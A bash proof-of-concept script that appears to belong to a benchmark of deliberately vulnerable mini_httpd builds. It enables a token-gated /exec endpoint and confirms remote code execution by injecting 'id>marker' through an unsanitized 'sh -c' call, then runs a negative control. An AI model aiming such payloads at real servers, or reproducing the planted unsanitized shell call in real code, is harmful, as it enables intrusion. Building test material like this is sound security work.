#!/usr/bin/env bash
# PoC for 145_mini_httpd_C3I2S1
# Axes: C3 (config file + runtime init) / I2 (snprintf sh -c wrapper) / S1 (no sanitization)
#
# C3: config has exec_mode=1 + exec_secret; must call /exec/init?token= first.
# S1: no sanitization at all.
# Negative control: start with exec_mode=0 in config; init fails (403), /exec returns 404.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/mini_httpd"
WWWROOT="/tmp/poc_145_www"
MARKER="/tmp/poc_145_marker"
CONFIG="/tmp/poc_145.conf"
PORT=18145
NEG_PORT=19145
INIT_FLAG="/tmp/mini_httpd_exec_init_145"

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONFIG" "$INIT_FLAG"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"
rm -f "$INIT_FLAG"

# write config file with exec_mode=1 and exec_secret
cat > "$CONFIG" <<'EOF'
exec_mode = 1
exec_secret = s3cr3t
EOF

# start server with config
echo "[*] starting mini_httpd with --config $CONFIG on port $PORT..."
"$BINARY" -p "$PORT" -d "$WWWROOT" -D --config "$CONFIG" &
SERVER_PID=$!
sleep 0.5

# init step: call /exec/init?token=s3cr3t to create flag file
echo "[*] calling /exec/init to create init flag file..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t" > /dev/null || true
sleep 0.2

# trigger exploit -- I2: sh -c wrapper, S1: no sanitization
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true
sleep 0.2

# verify
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# negative control: start with exec_mode=0; init fails (403), /exec returns 404
echo "[*] verifying gate: endpoint absent with exec_mode=0..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
rm -f "$INIT_FLAG"
NEG_CONFIG="/tmp/poc_145_neg.conf"
echo "exec_mode = 0" > "$NEG_CONFIG"
echo "exec_secret = s3cr3t" >> "$NEG_CONFIG"
"$BINARY" -p "$NEG_PORT" -d "$WWWROOT" -D --config "$NEG_CONFIG" &
SERVER_PID=$!
sleep 0.5
# attempt init (should fail with 403)
curl -sf "http://127.0.0.1:${NEG_PORT}/exec/init?token=s3cr3t" > /dev/null 2>&1 || true
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
rm -f "$NEG_CONFIG"
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 with exec_mode=0"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
